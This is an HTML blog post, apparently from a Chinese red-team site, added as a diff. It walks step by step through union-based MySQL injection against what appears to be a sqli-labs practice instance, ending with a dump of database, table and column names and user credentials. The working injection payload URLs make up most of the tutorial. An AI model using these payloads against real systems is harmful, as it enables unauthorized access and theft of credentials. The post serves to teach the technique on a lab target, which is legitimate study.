@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>MySQL注入原理剖析 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">MySQL注入原理剖析</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 6, 2019&nbsp;&nbsp;20:44:36</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1374304901&auto=1&height=66"></iframe>
+
+<h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h2><ul>
+<li>SQL注入流程：</li>
+<li>1、判断是否有注入（判断是否为严格校验）</li>
+<li>2、什么类型的SQL注入</li>
+<li>3、语句是否能够被恶意修改</li>
+<li>4、是否能够成功被带入执行</li>
+<li>5、获取我们想要的数据</li>
+</ul>
+<blockquote>
+<p>获取数据库 -&gt; 获取表 -&gt; 获取字段 -&gt; 获取字段内容</p>
+</blockquote>
+<h2 id="判断是否有注入"><a href="#判断是否有注入" class="headerlink" title="判断是否有注入"></a>判断是否有注入</h2><p>注入点 : <code>http://43.247.91.228:84/Less-2/?id=1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">常见的有：</span><br><span class="line">	第一种：and</span><br><span class="line">	and 1=1	  返回正常	</span><br><span class="line">	and 1=2	  返回错误</span><br><span class="line">  </span><br><span class="line">    第二种：.0 、 .1</span><br><span class="line">    ?id=3.0   返回正常</span><br><span class="line">    ?id=3.1	  返回错误</span><br><span class="line">    </span><br><span class="line">    第三种：&#x27; (单引号)</span><br><span class="line">    ?id=3&#x27;	  加单引号报错</span><br><span class="line">    </span><br><span class="line">    第四种：-1</span><br><span class="line">    ?id=3-1   会返回 ?id=2 这个页面</span><br></pre></td></tr></table></figure>
+
+<p>正常页面：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/546.png" alt="图片"></p>
+<p><code>and 1=1</code>    返回正常：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/547.png" alt="图片"></p>
+<p><code>and 1=2</code>    返回错误</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/548.png" alt="图片"></p>
+<p><code>’</code>   加单引号返回错误显示</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/549.png" alt="图片"></p>
+<p>判断后，存在<code>SQL</code>注入！</p>
+<h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p>在 <code>MySQL</code> 中，有一个很重要的数据库：<code>information_schema</code>，而它有三个很重要的表</p>
+<p>第一个表个是：<code>SCHEMATA</code> ：<br><code>information_schema</code> ， 而这个数据库中的 <code>SCHEMATA</code> 表中的 <code>SCHEMA_NAME</code> 列中的值有我们的所有的数据库名</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/550.png" alt="图片"></p>
+<p><code>information_schema</code>：<br>第二个表是：<code>TABLES</code>        <code>TABLES</code> 这个表里的包含了数据库中所有的字段</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/551.png" alt="图片"></p>
+<p><code>information_schema</code>：<br>第三个表是：<code>COLUMNS</code>        <code>COUMNS</code> 这个表里的包含了数据库中所有的表</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/552.png" alt="图片"></p>
+<h3 id="查询想要的数据"><a href="#查询想要的数据" class="headerlink" title="查询想要的数据"></a>查询想要的数据</h3><p>使用 <code>union</code> 查询是否有 <code>4</code> 列 ， <code>%23</code> 是 <code>#</code> 号的 URL 编码，是<code>注释</code>的意思（列数一样就不报错，列数不一样就报错）<br><code>http://43.247.91.228:84/Less-2/?id=2 union select 1,2,3,4 %23</code></p>
+<p>这边是报错了，显示：The used SELECT statements have a different number of columns （查询的内容前后的列数不一致）说明不是 4 列</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/553.png" alt="图片"></p>
+<p>使用 <code>union</code> 查询是否有 <code>3</code> 列 ， <code>%23</code> 是 <code>#</code> 号的 URL 编码，是注释的意思（因为刚刚判断是否有4列出错了，那么就往前减少一位数字判断）<br><code>http://43.247.91.228:84/Less-2/?id=2 union select 1,2,3 %23</code></p>
+<p>这边是显示正常，说明是 <code>3</code> 列</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/554.png" alt="图片"></p>
+<p>这里有个疑问，这个 1,2,3 是什么意思呢？<br>1,2,3，是一个<code>占位</code>的意思。它的意思就是判断前面的列数有几列，一个逗号分隔的就是一列<br>写其他的也可以，例如：66,777,8888</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/555.png" alt="图片"></p>
+<p>这个时候就可以在 1,2,3 <code>占位符</code>里使用 SQL 语句来查询了！<br>因为有 <code>union</code> 查询，是查询前面和后面联合起来查询的，假如直接在列里插入 <code>user（）</code> //查询当前数据库用户名，不会显示</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/556.png" alt="图片"></p>
+<p>这是为什么呢？<br>因为 左边的 <code>http://43.247.91.228:84/Less-2/?id=2</code> 是一条查询语句<br>右边的 <code>select 1,user(),3 %23</code> 没有任何条件也可以查询出来<br>合并起来就是两条数据，但是呢它在显示数据的时候，默认只显示它的第一个数据，就是左边的数据，右边的数据有也不显示<br>这个时候我们就可以让左边的数据没有，就可以显示出了：</p>
+<p><code>-2</code> 是没有的，然后就可以构造语句 ：    <code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,user(),3 %23</code><br>这个时候就查询出当前数据库用户名是 <code>root</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/557.png" alt="图片"></p>
+<p>查询 <code>information_schema</code> 数据库中的 <code>schemata</code> 表里的 <code>schema_name</code> 字段<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,schema_name,3 from information_schema.schemata %23</code></p>
+<p>详解：<br>    information_schema.schemata        查询 information_schema 数据库下的 schemata 表<br>    schema_name                        这个就是 schemata 表里的字段<br>下面是数据库的结构：    </p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/558.png" alt="图片"></p>
+<p>这边只查询出一条数据，查询出来后会显示第一个的字段内容：<code>information_schema</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/559.png" alt="图片"></p>
+<p>想要查询所有的呢，就可以使用一个函数：<code>group_concat()</code>    吧所有的列的数据都显示，以逗号分隔</p>
+<p><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(schema_name),3 from information_schema.schemata %23</code></p>
+<p>详解：<br>    group_concat(schema_name)        这个是用 group_concat 函数查询 schema_name 字段中的所有数据，并以逗号显示出来</p>
+<p>这样就查询出了所有的数据库 ：    information_schema,challenges,hacker,mysql,security,sql,test</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/560.png" alt="图片"></p>
+<h3 id="查询当前所使用的数据库名"><a href="#查询当前所使用的数据库名" class="headerlink" title="查询当前所使用的数据库名"></a>查询当前所使用的数据库名</h3><p>使用 <code>database()</code> 查询当前数据库名：</p>
+<p><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,database(),3 from information_schema.schemata %23</code><br><code>database()</code> 是SQL语句中查询当前数据库名的函数<br>这边查询出来，当前所使用的数据库名是：<code>security</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/561.png" alt="图片"></p>
+<p>知道了当前所使用的数据库是 <code>security</code> 后，我们需要查询数据库下有那些表：（所有的）<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(table_name),3 from information_schema.tables %23</code></p>
+<p>详解：<br>    information_schema.tables        查询 information_schema 数据库下的 tables 的内容<br>    group_concat(table_name)        使用 group_concat() 函数来显示出 table_name 列中的所有字段内容</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/562.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/563.png" alt="图片"></p>
+<p>上面的列出了所有的表了，但是我们想获取当前数据库下的表：<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() %23</code></p>
+<p>详解：<br>    information_schema.tables 查询 information_schema 数据库下的 tables 表<br>    where table_schema = database() 使用 where 来指出只查询 table_schema 字段里当前所使用的数据库里的表（这个是一个条件语句）<br>    database()    是一个函数，查看当前数据库名</p>
+<p>现在我们知道了，当前所使用的数据库中有四张表：mails,referers,uagents,users<br>一般 <code>users</code> 里会保存账号密码</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/564.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/565.png" alt="图片"></p>
+<p>查询 <code>users</code> 表里的字段：<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name=&#39;users&#39; #</code></p>
+<p>详解：<br>    information_schema.columns            查询 information_schema 数据库下的 columns 表<br>    where table_schema = database()        使用 where 来指出只查询 table_schema 字段里当前所使用的数据库里的表（这个是一个条件语句）<br>    and table_name=’users’                and 条件语句来指出查询 table_name 表里的 ‘users’ 字段</p>
+<p>这里就查询出了 <code>users</code> 表下的字段：id,username,password</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/566.png" alt="图片"></p>
+<p>查询 username，password 字段内容：<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,username,password from security.users #</code></p>
+<p>详解：<br>    在占位符中填写刚刚查询出来的字段名：username，password<br>    from security.users        查询 security 数据库中的 users 表</p>
+<p>查询出来了，他们两个的值是 <code>Dumb</code>（这边只是默认的第一行）</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/567.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/568.png" alt="图片"></p>
+<p>查询所有的字段内容：<br><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,group_concat(username),group_concat(password) from security.users #</code></p>
+<p>详解：<br>    还是使用 <code>group_concat()</code> 这个函数来实现的！</p>
+<p>但是现实出来的不是那么的美观，而且你也不知道那个用户名对应的是那个密码    </p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/569.png" alt="图片"></p>
+<p>使用函数来实现让它们一一对应现实出账号密码：</p>
+<p><code>http://43.247.91.228:84/Less-2/?id=-2 union select 1,concat(&#39;:&#39;,username,password),3 from security.users #</code></p>
+<p>详解：<br>    concat(‘:’,username,password)        使用<code>concat()</code>函数来对 username，password 来一一对应<br>    而 <code>&#39;:&#39;</code> 是为了让账号和密码用 : 来分隔</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/570.png" alt="图片"></p>
+<p>查询所有的列：<br>    <a target="_blank" rel="noopener" href="http://43.247.91.228:84/Less-2/?id=-2">http://43.247.91.228:84/Less-2/?id=-2</a> union select 1,group_concat(concat(‘:’,username,password)),3 from security.users #</p>
+<p>详解：<br>    group_concat(concat(‘:’,username,password))<br>    还是使用 concat(‘:’,username,password) 来对 username，password 来一一对应，并使用 ： 来进行分隔<br>    而 group_concat() 函数是用来现实全部的    </p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/571.png" alt="图片"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/11/06/SQL-1/">http://example.com/2019/11/06/SQL-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/Mysql/"># Mysql</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/11/19/Nginx-2/">Nginx-目录遍历漏洞</a>
+            
+            
+            <a class="next" rel="next" href="/2019/10/31/RedTeaming-4/">Windows提权之主机信息搜集</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
